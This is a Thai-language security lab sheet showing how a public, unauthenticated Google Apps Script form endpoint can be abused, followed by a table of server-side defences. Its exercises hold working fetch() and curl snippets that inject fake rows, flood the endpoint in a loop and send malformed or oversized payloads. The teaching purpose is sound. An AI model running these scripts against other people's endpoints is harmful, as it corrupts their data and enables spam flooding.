# 🔓 Security Demo — ยิง endpoint แบบ attacker (เพื่อการเรียนรู้)

> ⚠️ **ใช้กับ endpoint ของตัวเองเท่านั้น** — คุณเป็นเจ้าของ Sheet + Apps Script + Deployment
> นี่คือ authorized security testing เพื่อเรียนรู้ ไม่ใช่การโจมตีระบบคนอื่น
> การยิง endpoint ที่ไม่ใช่ของตัวเองโดยไม่ได้รับอนุญาต = ผิดกฎหมาย

---

## เป้าหมายการเรียนรู้

เข้าใจว่าทำไม endpoint ที่ **เปิด public + ไม่มี auth + ไม่ validate** ถึงถูก abuse ได้ง่าย
และทำไมการป้องกันต้องทำ **ฝั่ง server** ไม่ใช่ฝั่ง client

---

## 🎯 Target

```
POST https://script.google.com/macros/s/AKfycbx-.../exec
Content-Type: text/plain;charset=utf-8
Body: JSON ของข้อมูลแบบสอบถาม
```

**ช่องโหว่:**
1. `Who has access: Anyone` → ไม่ต้อง login
2. `doPost` ไม่ตรวจว่าใครส่งมา รับ JSON อะไรก็เขียนลง Sheet ทันที
3. URL อยู่ใน client-side JS → เปิด DevTools ก็เห็น (secret ฝั่งหน้าบ้านซ่อนไม่ได้)

---

## 🧪 Exercise 1 — ยิงข้อมูลปลอม 1 แถว

เปิดหน้าฟอร์ม → `F12` → แท็บ **Console** → วาง:

```js
fetch(window.CONFIG.SCRIPT_URL, {
  method: "POST",
  mode: "no-cors",
  headers: { "Content-Type": "text/plain;charset=utf-8" },
  body: JSON.stringify({
    fullName: "😈 HACKED (test)",
    age: "999",
    email: "attacker@evil.com",
    q1: "X", q2: "Y", q3: "Z",
    submittedAt: new Date().toISOString()
  })
});
```

**ผลลัพธ์:** แถวขยะเด้งเข้า Sheet ทันที ทั้งที่ไม่ได้แตะฟอร์มเลย

**เรียนรู้:** ไม่มีการยืนยันตัวตน ใครมี URL ก็เขียนข้อมูลได้

---

## 🧪 Exercise 2 — Spam flood (ยิงรัว)

```js
for (let i = 0; i < 20; i++) {
  fetch(window.CONFIG.SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify({ fullName: "spam #" + i, age: i })
  });
}
```

**ผลลัพธ์:** 20 แถวขยะเข้ารวดเดียว — เปลี่ยน `20` เป็น `10000` ก็ทำได้ Sheet รก/ข้อมูลเสีย

**เรียนรู้:** ไม่มี rate limiting → ยิงเท่าไหร่ก็ได้

---

## 🧪 Exercise 3 — ยิงจากหน้าเปล่า (ไม่ต้องอยู่หน้าฟอร์ม)

เปิด `about:blank` หรือเว็บอะไรก็ได้ → Console → hardcode URL ตรงๆ:

```js
const URL = "https://script.google.com/macros/s/AKfycbx-.../exec"; // แปะ URL จริง
fetch(URL, {
  method: "POST",
  mode: "no-cors",
  headers: { "Content-Type": "text/plain;charset=utf-8" },
  body: JSON.stringify({ fullName: "from-anywhere" })
});
```

**เรียนรู้:** `no-cors` ไม่สน origin → attacker ไม่จำเป็นต้องเปิดเว็บเรา แค่รู้ URL ก็พอ

---

## 🧪 Exercise 4 — ยิงจาก terminal (curl) ไม่ง้อ browser

```bash
curl -L -X POST "https://script.google.com/macros/s/AKfycbx-.../exec" \
  -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"fullName":"from-curl","age":"1"}'
```

> `-L` ให้ curl ตาม redirect ของ Google
> ต่างจาก browser: curl **อ่าน response ได้** → เห็น `{"status":"success"}` หรือ error กลับมา

**เรียนรู้:** attacker จริงยิงจาก server/สคริปต์ เร็วและ scale กว่า browser มาก

---

## 🧪 Exercise 5 — ส่ง payload ผิดรูปแบบ (ทดสอบความทน)

```js
// ส่ง body ที่ไม่ใช่ JSON
fetch(window.CONFIG.SCRIPT_URL, {
  method: "POST", mode: "no-cors",
  headers: { "Content-Type": "text/plain" },
  body: "this is not json {{{"
});

// ส่ง field เกินจำนวน / ค่ายาวมาก
fetch(window.CONFIG.SCRIPT_URL, {
  method: "POST", mode: "no-cors",
  headers: { "Content-Type": "text/plain" },
  body: JSON.stringify({ fullName: "A".repeat(50000) })
});
```

**เรียนรู้:** ดูว่า `doPost` จัดการ input แปลกๆ ยังไง (โค้ดปัจจุบันมี `try/catch` — ไม่ crash แต่ก็ไม่ได้กันการเขียน)

---

## 🧹 ล้างข้อมูลทดสอบ

หลังทดลอง เปิด Sheet → เลือกแถวขยะ → คลิกขวา → Delete rows
(หรือลบทั้งแท็บ Responses แล้วให้สคริปต์สร้างใหม่)

---

## 🛡️ สรุป: ทำไมต้องกันฝั่ง server

| ชั้นป้องกัน | ฝั่ง | กันได้จริงไหม |
|---|---|---|
| ซ่อน URL ใน JS | client | ❌ เปิด DevTools ก็เห็น |
| ตรวจ origin ฝั่ง client | client | ❌ attacker ยิงจาก curl/console ได้ |
| Shared token ตรวจใน `doPost` | **server** | ⚠️ ช่วยได้บ้าง แต่ token ก็อยู่ใน JS |
| reCAPTCHA (verify token ฝั่ง server) | **server** | ✅ กัน bot ได้ดี |
| Rate limiting / honeypot field | **server** | ✅ ลด flood |

**หลักการ:** อะไรที่ฝังใน JavaScript หน้าบ้าน = attacker เห็นหมด
การป้องกันที่ได้ผลจริงต้องตัดสินใจ **ฝั่ง Apps Script (server)** เท่านั้น

---

## ▶️ ขั้นต่อไป

ทำระบบกันสแปมใน `doPost` แล้วกลับมายิง Exercise 1–4 ซ้ำ เพื่อดูว่ามันโดนบล็อกยังไง
(honeypot + rate limit + reCAPTCHA) — เป็น exercise เรียน security ที่ครบวงจร
